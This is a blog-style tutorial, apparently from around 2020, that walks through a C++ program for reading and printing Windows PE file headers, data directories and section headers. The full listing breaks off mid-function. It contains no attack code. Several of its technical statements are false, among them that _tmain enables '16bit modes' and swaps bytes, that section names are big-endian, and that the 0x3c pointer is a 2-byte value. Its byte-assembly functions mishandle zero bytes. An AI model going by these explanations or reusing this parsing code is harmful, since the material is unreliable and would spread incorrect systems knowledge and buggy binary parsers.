If you invoke int _tmain, you enable 16bit modes in C++ code. Well, that’s the short version for this, at least.</p>
<p><strong>_tmain</strong>  is like a switch that automatically decides whether main or wmain should be called, a Microsoft extension.<br>
It enables Unicode (UTF-16) character sets and also swaps the bytes because of it’s endianess, thus resulting in the program seeing a bunch of 0 terminated strings rather than char arrays. If you want to know more, go to <a href="https://stackoverflow.com/questions/895827/what-is-the-difference-between-tmain-and-main-in-c" rel="noopener nofollow ugc">this Stackoverflow post</a>. We basically Increase the support for modern operation systems and their weird file names while also using it as a kind of safety measure for reading hex values. I’ll talk about it in future posts, especially on Assembler.</p>
<p><strong>[  3-6  ] Handle to load the binary</strong><br>
Remember the first point on our list? Let’s start with that. I’m sure many of you will know how to read a file in C++, but let me introduce file Handles to you. A handle is basically a pointer to something. In this case, it’s to a file. This pointer helps us to read, write, copy or overwrite said file however we want. It is also useful if we want to modify the binary later. Let’s not stick to this for too long,  <strong>it’s a higher level-pointer that’s well documented</strong> . The  <strong>LPDWORD</strong>  and  <strong>DWORD</strong>  are both integers that we’ll be using to read the binary into memory.</p>
<p><strong>[  9  ] The binary pointer</strong><br>
One part of the answer to  <strong>How are we going to orient our self over the file</strong>  lies within this variable. As the name tries to imply, it will save our current location while moving through the file, but currently it’s set to 0 so it just points to the very beginning.</p>
<p><strong>[  18-19  ] Open FileHandle</strong><br>
At 18-19 we are creating the actual HANDLE file object. The first argument  <strong>CreateFile</strong>  takes is a path to a file. We are providing an Unicode version [with the “L” prefix] of the string, so every language should be supported. Also, CreateFile is a nice function, it accepts both forward- and backward-slashes.  <em>Way to go, CreateFile!</em><br>
The next parameters are access rights and some attributes, and all I had to do is <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea" rel="noopener nofollow ugc">look into the documentation</a> and fiddle it out until it worked. Let’s skip this trivial path</p>
<p>It’s really up to you which binary you pick for testing, but it  <strong>really</strong>  is useful to test multiple files during development. You don’t want to fall to false assumptions. I was halfway through development when I realized that not all values are at fixed locations. In fact, none of them really are. Alas, had I only tested multiple files first, I had saved at least 2 hours of rewriting and testing stuff.<br>
<em>Fool your assumptinons before getting fooled by your assumptions.</em></p>
<p><strong>[  26-37  ] Read the file into memory</strong><br>
We created a file, now it is time to read it. The <a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile" rel="noopener nofollow ugc">ReadFile function</a> isn’t an easy function to work with. At first I should say that there are 2 versions of the function, a synchronous and an asynchronous one. The latter is required for reading streams, drivers and the like, stuff that changes a lot, and it is called  <strong>ReadFileEx</strong> . We will need a callback here, as you’ll notice.</p>
<h4>Implementing a File Reader [2] Functions and callback</h4>
<p>It’s time to look at some functions that we’ll be using to step over the file and output stuff. We are going to plan ahead here. Since we want to extend the program in the future, we will already implement a function to output a chunk of hex bytes with line numbering, just like a disassembler. Also, make sure you are really understanding what’s going on, especially with the  <strong>OR-operation</strong> . We’ll get to this, let’s first again look at the code and think about it after wards.</p>
<pre><code class="lang-auto">#include &lt;windows.h&gt;
#include &lt;tchar.h&gt;
#include &lt;iostream&gt;

#define QWORD_L 8
#define DWORD_L 4
#define BYTE_L 1
#define WORD_L 2

using namespace std;
//for use in callback
DWORD transfered = 0;

//actual callback for asynchronous reading
VOID CALLBACK finished
(
 __in  DWORD dwErrorCode,
 __in  DWORD dwNumberOfBytesTransfered,
 __in  LPOVERLAPPED lpOverlapped
)
{
 _tprintf(TEXT("Error code:\t%x\n"), dwErrorCode);
 _tprintf(TEXT("Number of bytes:\t%x\n"), dwNumberOfBytesTransfered);
 transfered = dwNumberOfBytesTransfered;
}

//later for oop (parameter called by reference)
void copy_bytes(char* &amp;dump,  char* &amp;memory, int start, int end)
{
 int counter = 0;

 while (start &lt; end)
 {
  memory[counter++] = dump[start++];
 }
 return;
}

//give single data fields or output values
//TO DO: write function so you can input start, dword (or whatever)
void output_data(char* memory, int start, int end)
{
 if (end &lt; start)
  return;
 fprintf(stdout, "0x");
 while (end &gt;= start)
 {
  fprintf(stdout, "%02hhX", memory[end]);
  end--;
 }
}

//same function, but grabbing text this time, so reversed output direction (big-endian)
void output_data_ascii(char* memory, int start, int end)
{
 if (end &lt; start)
  return;
 while (start &lt; end)
 {
  fprintf(stdout, "%c", memory[start]);
  start++;
 }
}

//because file shambles
int getValuePNTR(const char* memory, int &amp;start, int size)
{
 uint64_tretVal = 0;

 //now just add up array fields 
 for (int i = start + size-1,j = size-1; j &gt;= 0; --j, i--)
 {
  //fprintf(stdout, "\ncycle: %d, memory: [%x]", j, memory[i]);

  if ((unsigned char)memory[i] == 00 &amp;&amp; j &gt; 0)
   retVal &lt;&lt;= 8;
  else
   retVal |= ((unsigned char)(memory[i]) &lt;&lt; (8 * j));
 }
 //get the next field after this one
 start += size;
 return retVal;
}
//overwrite function
int saveValuePNTR(char* memory, int start, int size)
{
 uint64_tretVal = 0;
 for (int i = start + size - 1, j = size - 1; j &gt;= 0; --j, i--)
 {
  if ((unsigned char)memory[i] == 00 &amp;&amp; j &gt; 0)
   retVal &lt;&lt;= 8;
  else
   retVal |= ((unsigned char)(memory[i]) &lt;&lt; (8 * j));
 }
 return retVal;
}

//output stuff
void output_bytes(char* memory, int start, int end)
{
 //tracker for formatting the dump
 int counter = 1;
 int linebreaker = 0;

 int offset = start ? start % 0x10 : 0;

 //output the binary, use upper case X in format string for BIG LETTERS
 fprintf(stdout, "%010x: ", start - offset);

 for (int i = start - offset; i &lt; end; i++)
 {
  if (counter &gt; 3)
  {
   // print dots if we have an uneven countVal
   if (offset &gt; 0)
   {
    offset--;
    fprintf(stdout, ".. ");
    counter = 0;
   }
   else
   {
    fprintf(stdout, "%02hhX ", memory[i]);
    counter = 0;
   }
   linebreaker++;
  }
  else
  {
   // print dots if we have an uneven countVal
   if (offset &gt; 0)
   {
    offset--;
    fprintf(stdout, "..");
   }
   else //print the opcode
    fprintf(stdout, "%02hhX", memory[i]);
  }
  counter++;

  if (linebreaker &gt; 3)
  {
   fprintf(stdout, "\n");
   fprintf(stdout, "%#010x: ", i + 1);
   linebreaker = 0;
  }
 }
 cout &lt;&lt; endl &lt;&lt; endl;
}
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
</code></pre>
<p>Copy</p>
<p>It looks longer than it is, really. The hardest part is probably the last one. Right after the imports, I created some macros to represent byte lengths. Now, I know I could just type in the numbers, but it really is better to read, and also did I have problems with the standard ones so I made my own.</p>
<p><strong>[ 1-8 ] The callback for ReadFile</strong><br>
This callback works in conjunction with the ReadFile function we already looked at in the beginning of _tmain. I was just copying it from the Microsoft documentations, so you’d be better off by just searching there. If you just want to understand it for now, it kind of copys chunks of data of fixed size, checking for EOF in between reads. The callback can be used to transmit errors and signals. It bounces a parameter referenced to as “NumbersOfBytesTransfered” over each cycle. There’s really not that much up with it. Also it doesn’t stop on a NULL-byte because it thinks that it’s a string termination, which is kinda nice.</p>
<p><strong>[ 27-37 ] Copy between files</strong><br>
This function can be used to copy chunks of bytes between different files. Remember that we created a file with our file handle, we might want to automatically insert code chunks at special points in the code some time in the future. Consider this function a typical  <em>it will come in handy  <strong>LATER</strong></em> .</p>
<p><strong>[ 41-63 ] Output raw data</strong><br>
These two functions can be used to output data from the binary. You might notice the format string  <strong>%02hhx</strong> . It is a 2 digit hexadecimal format, and you should get used to this kind of format strings.</p>
<ul>
<li>
<strong>0</strong>
<ul>
<li>fill the number with zeros to align the digits (f.e. write 0001 instead of 1)</li>
</ul>
</li>
<li>
<strong>2</strong>
<ul>
<li>the length of the number</li>
</ul>
</li>
<li>
<strong>hh</strong>
<ul>
<li>if followed by a x, this will make the input an unsigned char</li>
</ul>
</li>
<li>
<strong>x</strong>
<ul>
<li>output as hexadecimal number as specified</li>
</ul>
</li>
</ul>
<p>The third part is crucial. When working with hexadecimal output we are  <strong>always required to work with unsigned chars</strong> , as I had to learn the hard way. If you don’t state that you are expecting the values to be unsigned, your output will be totally random, since the first bit in each variable is usually interpreted as the sign. If you get strange readings during testing, check for the signing of especially chars.</p>
<p>You’ll notice that for the second function, I broke my own premise of always using unsigned chars. Yikes! The reason for this is simple: we aren’t using any hex values here. When dealing with binaries, you’ll often encounter data saved in plain text form. Usually strings, but sometimes information for the loader, too. These strings are stored in  <strong>big-endian</strong> , which means they are “forward” written in the file (like in, how a human would read them).</p>
<p>That’s great, they made this so we have an easy life reading the strings, right?! NAHAA, it’s only because they get read in reverse order into memory later anyway. Don’t assume anybody would help you fiddling around with their stuff! [JK lol]</p>
<p><strong>[ 66-98 ] Oh, to read a DWORD</strong><br>
These next functions are really our bread and butter. We are going to call them very often, indeed. And it is them that feature the OR-operation that took me almost 2 weeks. It failed constantly, and I had no idea why.<br>
Both functions start identically: They take a chunk of data as first argument, a pointer into that chunk as second one, and a to-read size as third parameter. One difference you might notice is that the first functions takes the start parameter as a call-by-reference so we can increment it while we are at it. This way you can read values and at the same time increment the file pointer, which saves us some memory.</p>
<p>Both functions first define a  <strong>uint64_t</strong> . Normally I had used DWORD or QWORD here, but recently I found out my program would crash when reading 64bit code, so we are using the 8 byte long variable here all along.<br>
I was going to write how awesome DWORD is because it’s managed by operation system instead of language, but uint64_t should be 8 byte long always, too, so we won’t get any problems in the future, except maybe someone invents 128bit processors, but this is actually pretty unlikely (in 2020, lul).</p>
<p>Following along, we check whether we read a zero-byte, and if so, we just shift the return variable one byte to the left. This is necessary because we might read a zero as last input, and instead of just adding 00 as the count for position 0, we would shift the first byte out of scope. You can try this out and see it yourself if you want, or you can just trust me on this one.</p>
<p>After we found the byte, we have to shift it to the left a number of times equal to the relative position inside the byte-mask. For example, if we have the value 1 at the third position of the value, we have to shift it to the left three times. This is a bit of a brainfuck at first, especially since values are usually stored little-endian style, but you’ll get used to it pretty fast. After the value was shifted, we (logical) OR it against the return variable. This way we insert the correct value byte by byte.</p>
<p>The biggest difference between these two functions is probably that the first one increments the filepointer after reading the value, so we can just read the next, and the next and so forth. The latter doesn’t do so, since we want to save the value from the binary AND call the first function after wards to output it, so this is just ease-of-use here.</p>
<p><strong>[ 99 ] Future use as decompiler</strong><br>
This whole function is designed to nicely print out a (big) chunk of data in a form that you would expect from a typical hex-editor. In the whole example program I’m currently not using it for anything, but I tested and fine-tuned it, so feel free to give it a try. It will print out line numbers as well as a little gap between DWORDS, so you can examine the binary. Although I am not really using it (or explaining), it is extremely useful to have for future examinations of binaries, so just keep it there, and maybe play around with it a little.</p>
<h4>Implementing a File Reader [3] The main work</h4>
<p>After the setup of all our functions and the loading of the binary into memory, it is time to actually get some data out of it. But first we have to solve a riddle in the file:<br>
<strong>Where the fuck does it start anyways?</strong></p>
<p>The answer to this question is:  <em>it depends…</em><br>
“Ah, great, another of these undecided binaries”, you might think.<br>
“Get your shit together, man!”</p>
<p>In fact the first value we need to extract from the binary is the most crucial for us at this point: The value at  <strong>0x3c</strong> . This magic number is an address at which we can find the PE-signature, and after that the real information is hidden. In it’s original form my program featured a function that just hard-reads this value, but since we have all our nice functions at the top, we are going to use them right away. Let’s take a look:</p>
<pre><code class="lang-auto">//first, get that 0x3c word so we know where to start reading
 readPointer = saveValuePNTR(fileContent, 0x3c, WORD_L);
 fprintf(stdout, "\nINITIALISING....\nReadpointer before operation: %x",readPointer);
 fprintf(stdout, "\n[DWORD]  PE-SIGNATURE           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\nReadpointer after operation: %x\nInitialising finished", readPointer);

 //first block: PE FILE HEADER
 fprintf(stdout, "\n\nCollect Information (PE file header):");
 fprintf(stdout, "\n[WORD]  Mashinae Type          :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 unsigned int sectionCount = saveValuePNTR(fileContent, readPointer, WORD_L);            
 fprintf(stdout, "\n[WORD]  Number of Sections     :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[DWORD] Timestamp              :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Pointer to symbol table:0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Number of Symbols      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[WORD]  Size of optional header:0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD]  Characteristics        :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 
 
</code></pre>
<p>Copy</p>
<p>Right at the start, we first grab the information about the PE-Signature, as I said it is located at 0x3c, and it is 2 byte long, hence the WORD_L. After that, I wrote a little initialization output just to be sure everything works as expected. Notable are the use of the  <strong>fprintf function.</strong>  By using this, we can later swap out the stdout with a file pointer, so we can easily create log files about our readings.<br>
I decided to use the format string  <strong>0x%08x</strong>  to give the output a fixed length of 8 digits. This will have to be tweaked for QWORDS later on.</p>
<p>The first block we are going to read is the PE file header. You can see in  <strong>line 10</strong>  how we are able to save some information that will come in handy later with the help of the  <strong>saveValuePNTR</strong>  function. The rest is just outputting information for now. This is pretty much how the rest of the code looks, with some exeptions for 64bit systems, as you can see below:</p>
<pre><code class="lang-auto">//second block: OPTIONAL HEADER
 fprintf(stdout, "\n\nOPTIONAL HEADER [general fields]:");
 unsigned int type = saveValuePNTR(fileContent, readPointer, WORD_L);              
 fprintf(stdout, "\n[WORD] Architecture            :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 if (type == 0x010b)
  fprintf(stdout, "  -&gt;  [32 bit]");
 else if (type == 0x20b)
  fprintf(stdout, "  -&gt;  [64 bit]");
 else if (type == 0x107)
  fprintf(stdout, "  -&gt;  [ROM img]");
 else
  fprintf(stdout, "  -&gt;  [unknown]");

 fprintf(stdout, "\n[BYTE] Major Linker Version    :0x%08x", getValuePNTR(fileContent, readPointer, BYTE_L));
 fprintf(stdout, "\n[BYTE] Minor Linker Version    :0x%08x", getValuePNTR(fileContent, readPointer, BYTE_L));
 fprintf(stdout, "\n[DWORD]Size of Code            :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD]SizeofInitialisedData   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD]SizeifUninialisedData   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD]Adress of Entrypoint    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD]CodeBase                :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));

 //next field depending on arch (only present in 32bit executables)
 if (type == 0x010b)
  fprintf(stdout, "\n[DWORD]Base of Data            :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));


 fprintf(stdout, "\n\nOPTIONAL HEADER [windows only fields]:");
 fprintf(stdout, "\n[DWORD / QWORD]ImageBase       :");

 unsigned int base;
 //next field depending on arch, 4 byte in 32bit, 8 byte in 64bit
 if (type == 0x010b)
 {
  base = saveValuePNTR(fileContent, readPointer, DWORD_L);
  fprintf(stdout, "0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  //fprintf(stdout, "\nDEBUG:     0x%08x , pointer @ %x     \n", base,readPointer);
 }
 else if (type == 0x020b)
 {
  base = saveValuePNTR(fileContent, readPointer, QWORD_L);
  fprintf(stdout, "0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
 }
 else
  base = 0xFFFFFFFF;

 unsigned int offset_segment = saveValuePNTR(fileContent, readPointer, DWORD_L);
 fprintf(stdout, "\n[DWORD]Section Alignement      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n...beginning of text segment @  0x%08x", (base + offset_segment));

 fprintf(stdout, "\n[DWORD]File Alignement         :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[WORD] OS VERSION major        :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] OS VERSION minor        :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] image version major     :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] image version minor     :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] subsystem major version :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[WORD] subsystem minor version :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
 fprintf(stdout, "\n[DWORD] xxxXXX ZERO VAL XXXxxx :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Imagesize in bytes     :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Size of headers        :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\n[DWORD] Checksum               :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));

 unsigned int subsystem = saveValuePNTR(fileContent, readPointer, WORD_L);
 fprintf(stdout, "\n[WORD]  Subsystem version      :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));

 unsigned int dll_characteristic = saveValuePNTR(fileContent, readPointer, WORD_L);
 fprintf(stdout, "\n[WORD]  DLL characteristics    :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));

 //the next 4 values depend on architecture
 if (type == 0x010b)
 {
  fprintf(stdout, "\n[DWORD] SizeOfStackReserve     :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\n[DWORD] SizeOfStackCommit      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\n[DWORD] SizeOfHeapReserve      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\n[DWORD] SizeOfHeapCommit       :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 }
 else if (type == 0x20b)
 {
  fprintf(stdout, "\n[QWORD] SizeOfStackReserve     :0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
  fprintf(stdout, "\n[QWORD] SizeOfStackCommit      :0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
  fprintf(stdout, "\n[QWORD] SizeOfHeapReserve      :0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
  fprintf(stdout, "\n[QWORD] SizeOfHeapCommit       :0x%016x", getValuePNTR(fileContent, readPointer, QWORD_L));
 }
 
 
 
 
 
 
 
 
 
</code></pre>
<p>Copy</p>
<p>We are going to read the rest of the header and optional header. At some points, like in lines 5-12, it is necessary to differentiate between x86 and x86-64 systems. We can make this differentiation with the help of the value we read in line 3. This is one of the more crucial information we have to gather, as it is used further below again. Also, note that we have to expand the format string to  <strong>0x%016x</strong>  if we are to output 64bit information.<br>
Since a single byte needs 2 digits to be displayed ( from range 00 to ff ), we have to expand the format string in these cases. Luckily, there are only minor differences between 32bit and 64bit binaries. I suggest you read into the <a href="https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#dll-characteristics" rel="noopener nofollow ugc">Microsoft Documentation</a>, as I stated earlier.</p>
<p>In the documentation, you can see the length of the fields in each architecture, so we just have to insert some switches there and use our existing functions to expand to a QWORD_L there. Some values are of mere WORD length, and some are even single BYTE.</p>
<p>Coming up next are the  <strong>Data Directories</strong> . These are essentially pointers into sections, and they are primarily for the linker, so that he has some shortcuts when setting up the process into memory. You CAN, however, use them to find important sections like the Import Table (which is one of the most important ones), so when augmenting a program, these pointers will be useful to your augmentor program.</p>
<pre><code class="lang-auto">unsigned int remainder = saveValuePNTR(fileContent, readPointer, DWORD_L);
 fprintf(stdout, "\n[DWORD] Remaining header count :0x%08x [Remaining data directories]", getValuePNTR(fileContent, readPointer, DWORD_L));
 fprintf(stdout, "\nPointer now @ %x", readPointer);

 //next up are the data directories, there are usually 16 of them
 //each is 8 byte, so 16 * 8 = 128 &gt;&gt; size of directory entries

 if (remainder == 16)
 {
  fprintf(stdout, "\n\n############################################################\nData Directory entries:");
  fprintf(stdout, "\nExport Table           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nImport Table           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nResource Table         :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nException Table        :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nCertification Table    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nBase Relocation Table  :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nDebug                  :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nArchitecture           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nGlobal PTR             :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nTLS Table              :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nLoad Config Table      :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nBound Import           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nIAT                    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nDelay Import Descriptor:0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nCLR Runtime Header     :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nReserved Zero Value    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "      [Size]   :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nEnd Data Directories, PNTr now @  %x", readPointer);
 }
 else
 {
  fprintf(stdout, "\n\nDetected non-standart data directories, recalculating Pointer ...");
  readPointer += (remainder) * 8;
  fprintf(stdout, "\nEnd Data Directories, PNTr now @  %x", readPointer);
 }
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
</code></pre>
<p>Copy</p>
<p>At first, we save the remainder of data directories. Now, don’t get confused here, a PE file usually has 16 data directories.  <strong>ALWAYS</strong> . But when, for example, the remainder counts 10, it means that some directories are empty. For example, a binary may not export anything, or does not have a Debug section. If, for whatever reason, the binary has more or less than 16 data directories, we skip the output (for now), and recalculate the beginning of the section headers.</p>
<p><strong>The else part is wrong at the moment!</strong><br>
As I just described, the remainder is  <strong>not</strong>  the actual number of data directories, but I will just leave it as it is for now, it should not be too hard to recalculate if you ever have the need for it.</p>
<p>There is only one part left:  <strong>The actual section headers</strong> , so let’s dive right in:</p>
<pre><code class="lang-auto">/*
  Following section headers
  Each section header is 40 byte large (5 DWORDS)
  You can calculate the beginning of the headers, 
  but we came here anyways so let's skip that part
 */
 fprintf(stdout, "\n\n##########   BEGINNING OF SECTION HEADERS   ##########\n");
 for (int i = 0; i &lt; sectionCount; i++)
 {
  //first output the name in plain ascii, big-endian
  fprintf(stdout, "\n\n###################    ");
  output_data_ascii(fileContent, readPointer, readPointer + 8);
  fprintf(stdout, "    ###################");

  readPointer += 8;
  fprintf(stdout, "\nVirtual Size           :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nVirtual Address        :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nSize of Raw Data       :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nPointer to Raw Data    :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nPointer to Relocations :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nPointer to line numbers:0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
  fprintf(stdout, "\nNumber of Relocations  :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
  fprintf(stdout, "\nNumber of line numbers :0x%08x", getValuePNTR(fileContent, readPointer, WORD_L));
  fprintf(stdout, "\nCharacteristix         :0x%08x", getValuePNTR(fileContent, readPointer, DWORD_L));
 }

 //close handle, end of operations
 CloseHandle(targetBinary);
        std::cout &lt;&lt; "\nEnd reached!\n";

 return 0;
}

</code></pre>
<p>Copy</p>
<p>This is the last part of our program so far, and it will grab the section headers from the binary.<br>
Each section header has a fixed size and the same values associated with it, so we can just use a loop to grab all of them. Since the name of each section is stored in big-endian, aka human-readable way, we have to call our output_data_ascii function here. There isn’t really any magic in here, nothing you didn’t already encounter. Note that we manually have to increment the readPointer variable in each loop, since the output_data_ascii function doesn’t do this for us. The amount of section headers is already stored in the variable  <strong>sectionCount</strong> , so we always have the right amounts of loops ready.</p>
<p>At the end we need to close the handle to prevent memory leakage and overflowing.</p>
<h4>Full code</h4>
<p>Here I want to paste the full code in a single file so it’s easier to just copypasta it if you want to try it out yourself:</p>
<pre><code class="lang-auto">#include &lt;windows.h=""&gt;
#include &lt;tchar.h=""&gt;
#include &lt;iostream&gt;

#define QWORD_L 8
#define DWORD_L 4
#define BYTE_L 1
#define WORD_L 2

using namespace std;
//for use in callback
DWORD transfered = 0;

//actual callback for asynchronous reading
VOID CALLBACK finished
(
 __in  DWORD dwErrorCode,
 __in  DWORD dwNumberOfBytesTransfered,
 __in  LPOVERLAPPED lpOverlapped
)
{
 _tprintf(TEXT("Error code:\t%x\n"), dwErrorCode);
 _tprintf(TEXT("Number of bytes:\t%x\n"), dwNumberOfBytesTransfered);
 transfered = dwNumberOfBytesTransfered;
}

//later for oop (parameter called by reference)
void copy_bytes(char* &amp;dump,  char* &amp;memory, int start, int end)
{
 int counter = 0;

 while (start &lt; end)
 {
  memory[counter++] = dump[start++];
 }
 return;
}

//give single data fields or output values
//TO DO: write function so you can input start, dword (or whatever)
void output_data(char* memory, int start, int end)
{
 if (end &lt; start)
  return;
 fprintf(stdout, "0x");
 while (end &gt;= start)
 {
  fprintf(stdout, "%02hhX", memory[end]);
  end--;
 }
}

//same function, but grabbing text this time, so reversed output direction (big-endian)
void output_data_ascii(char* memory, int start, int end)
{
 if (end &lt; start)
  return;
 while (start &lt; end)
 {
  fprintf(stdout, "%c", memory[start]);
  start++;
 }
}

//because file shambles
int getValuePNTR(const char* memory, int &amp;start, int size)
{
 uint64_t retVal = 0;

 //now just add up array fields 
 for (int i = start + size-1,j = size-1; j &gt;= 0; --j, i--)
 {
  //fprintf(stdout, "\ncycle: %d, memory: [%x]", j, memory[i]);

  if ((unsigned char)memory[i] == 00 &amp;&amp; j &gt; 0)
   retVal &lt;&lt;= 8;
  else
   retVal |= ((unsigned char)(memory[i]) &lt;&lt; (8 * j));
 }
 //get the next field after this one
 start += size;
 return retVal;
}
//overwrite function
int saveValuePNTR(char* memory, int start, int size)
{
 uint64_t retVal = 0;
 for (int i = start + size - 1, j = size - 1; j &gt;= 0; --j, i--)
 {
  if ((unsigned char)memory[i] == 00 &amp;&amp; j &gt; 0)
   retVal &lt;&lt;= 8;
  else
   retVal |= ((unsigned char)(memory[i]) &lt;&lt; (8 * j));
 }
 return retVal;
}

//output stuff
void output_bytes(char* memory, int start, int end)
{
 //tracker for formatting the dump
 int counter = 1;
 int linebreaker = 0;

 int offset = start ? start % 0x10 : 0;

 //output the binary, use upper case X in format string for BIG LETTERS
 fprintf(stdout, "%010x: ", start - offset);

 for (int i = start - offset; i &lt; end; i++)
 {

  if (counter &gt; 3)
  {
   // print dots if we have an uneven countVal
   if (offset &gt; 0)
   {
    offset--;
    fprintf(stdout, ".. ");
    counter = 0;
   }
   else
   {
    fprintf(stdout, "%02hhX ", memory[i]);
    counter = 0;
   }
   linebreaker++;
  }
  else
  {
   // print dots if we have an uneven countVal
   if (offset &gt; 0)
   {
    offset--;
    fprintf(stdout, "..");
   }
   else //print the opcode
